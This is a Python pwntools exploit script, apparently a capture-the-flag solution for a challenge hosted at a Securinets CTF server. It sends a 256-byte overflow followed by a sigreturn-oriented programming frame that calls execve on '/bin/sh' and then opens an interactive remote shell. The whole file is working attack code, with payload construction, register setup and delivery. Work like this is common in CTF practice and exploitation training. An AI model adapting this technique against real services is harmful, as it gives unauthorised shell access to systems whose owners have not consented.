from pwn import *

context.arch = 'amd64'
context.os = 'linux'

#p=process("./main")
p=remote("pwn.ctf.securinets.tn",5002)

writable=0x00000000402000
offset=256
syscall=0x000000000040103e

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = writable           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0
frame.rip=syscall
payload=b"a"*offset + p64(0x0000000000401035)+p64(syscall)+p64(0x100)+p64(writable)+bytes(frame)

pause()
p.sendline(payload)
p.sendline(b"/bin/sh"+b"\x00"*7)

p.interactive()